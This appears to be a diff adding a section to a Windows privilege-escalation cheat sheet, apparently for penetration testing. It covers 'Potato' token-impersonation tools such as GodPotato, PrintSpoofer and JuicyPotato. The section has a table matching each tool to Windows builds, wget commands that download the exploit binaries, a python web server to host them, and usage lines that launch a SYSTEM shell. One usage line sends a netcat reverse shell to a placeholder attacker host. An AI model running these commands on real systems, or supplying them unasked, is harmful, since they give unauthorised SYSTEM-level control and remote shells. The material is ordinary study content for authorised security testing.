@@ -328,9 +328,36 @@ Run a matched, source-available kernel exploit (verify the CVE against the missi
 whoami /priv                          # confirm SeImpersonatePrivilege: Enabled
 ```
 
+**Which Potato for which Windows build** — the variant matters because Microsoft killed the older
+DCOM/NTLM-reflection trick in Win10 1809 / Server 2019 (build 17763). Check the build first
+(`systeminfo` / SMB banner):
+
+| Variant | Works on | Coercion / catch |
+|---|---|---|
+| RottenPotato / JuicyPotato | ≤ Server 2016 / Win10 1803 | DCOM CLSID — **dead on 2019+ (17763)** |
+| **PrintSpoofer** | 2016 / 2019 / Win10 1809+ | Print Spooler pipe — needs **Spooler** running |
+| RoguePotato | 2019 | DCOM — needs a **:135 redirector** (more setup) |
+| **GodPotato** | 2012 → 2022 (broad) | RPC/DCOM, .NET — newest, most reliable **default** |
+| SigmaPotato / SweetPotato | broad (GodPotato forks) | all-in-one, in-memory `.NET` runners |
+
+> **Rule of thumb:** modern box (2019/2022) → **GodPotato** (or PrintSpoofer if Spooler's up).
+> Legacy box (≤2016) → JuicyPotato. Don't waste time on JuicyPotato against 17763+ — it just fails.
+
 ```bash
+# GodPotato — pick the .exe matching the target's .NET (NET4 is the safe default)
+wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe
+# PrintSpoofer
+wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
+# SigmaPotato (all-in-one fork)
 wget https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe
 python3 -m http.server 80
+```
+
+```powershell
+# usage differs slightly per tool — all give a SYSTEM shell/command:
+.\GodPotato-NET4.exe -cmd "cmd /c whoami"
+.\GodPotato-NET4.exe -cmd "cmd /c C:\Windows\Temp\nc.exe {{LHOST}} {{LPORT}} -e cmd.exe"
+.\PrintSpoofer64.exe -i -c powershell            # -i interactive, or -c to run a command
 ```
 
 ```powershell
